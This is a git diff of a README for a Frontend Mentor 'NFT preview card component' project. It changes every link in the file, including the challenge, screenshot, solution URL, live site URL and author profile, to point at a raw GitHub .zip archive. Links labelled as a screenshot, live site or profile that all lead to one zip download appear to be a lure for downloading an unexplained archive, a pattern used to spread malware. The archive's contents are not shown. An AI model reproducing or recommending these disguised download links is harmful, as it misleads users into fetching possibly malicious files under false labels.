@@ -1,6 +1,6 @@
 # Frontend Mentor - NFT preview card component
 
-This is a solution to the [NFT preview card component challenge on Frontend Mentor](https://raw.githubusercontent.com/imadosan/nft-preview-card-component/main/design/preview_component_nft_card_v1.2-alpha.4.zip). Frontend Mentor challenges help you improve your coding skills by building realistic projects.
+This is a solution to the [NFT preview card component challenge on Frontend Mentor](https://raw.githubusercontent.com/imadosan/nft-preview-card-component/main/images/component-card-nft-preview-1.6.zip). Frontend Mentor challenges help you improve your coding skills by building realistic projects.
 
 ## Table of contents
 
@@ -21,13 +21,13 @@ Users should be able to:
 
 ### Screenshot
 
-![Screenshot of the site](https://raw.githubusercontent.com/imadosan/nft-preview-card-component/main/design/preview_component_nft_card_v1.2-alpha.4.zip)
+![Screenshot of the site](https://raw.githubusercontent.com/imadosan/nft-preview-card-component/main/images/component-card-nft-preview-1.6.zip)
 
 ### Links
 
-- Solution URL: [Click to visit](https://raw.githubusercontent.com/imadosan/nft-preview-card-component/main/design/preview_component_nft_card_v1.2-alpha.4.zip)
-- Live Site URL: [Click to visit](https://raw.githubusercontent.com/imadosan/nft-preview-card-component/main/design/preview_component_nft_card_v1.2-alpha.4.zip)
+- Solution URL: [Click to visit](https://raw.githubusercontent.com/imadosan/nft-preview-card-component/main/images/component-card-nft-preview-1.6.zip)
+- Live Site URL: [Click to visit](https://raw.githubusercontent.com/imadosan/nft-preview-card-component/main/images/component-card-nft-preview-1.6.zip)
 
 ## Author
 
-- Frontend Mentor - [@imadosan](https://raw.githubusercontent.com/imadosan/nft-preview-card-component/main/design/preview_component_nft_card_v1.2-alpha.4.zip)
+- Frontend Mentor - [@imadosan](https://raw.githubusercontent.com/imadosan/nft-preview-card-component/main/images/component-card-nft-preview-1.6.zip)
